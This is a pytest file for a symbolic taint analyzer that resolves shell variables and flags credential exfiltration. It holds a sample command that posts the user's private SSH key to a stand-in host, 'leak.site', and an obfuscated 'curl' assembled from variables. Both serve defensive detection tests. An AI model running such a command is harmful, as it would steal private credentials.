"""Tests for Symbolic Taint Analysis and Variable Propagation."""

import pytest
from sentinel.core.symbolic_taint import SymbolicTaintAnalyzer


@pytest.fixture
def analyzer() -> SymbolicTaintAnalyzer:
    return SymbolicTaintAnalyzer()


def test_variable_propagation(analyzer: SymbolicTaintAnalyzer) -> None:
    script = 'A="c"; B="url"; URL="https://example.com"; $A$B $URL'
    rep = analyzer.analyze(script)

    assert "A" in rep.symbol_table
    assert "B" in rep.symbol_table
    assert any("curl https://example.com" in cmd for cmd in rep.resolved_commands)


def test_tainted_credential_exfiltration(analyzer: SymbolicTaintAnalyzer) -> None:
    script = 'KEY="~/.ssh/id_rsa"; curl -X POST -d @$KEY https://leak.site'
    rep = analyzer.analyze(script)

    assert rep.is_tainted_exfiltration is True
    assert "KEY" in rep.tainted_variables
    assert any("Taint violation" in w for w in rep.propagated_warnings)


def test_benign_variable_assignments(analyzer: SymbolicTaintAnalyzer) -> None:
    script = 'DIR="./build"; mkdir -p $DIR; cp config.json $DIR/'
    rep = analyzer.analyze(script)

    assert rep.is_tainted_exfiltration is False
    assert rep.is_tainted_destruction is False
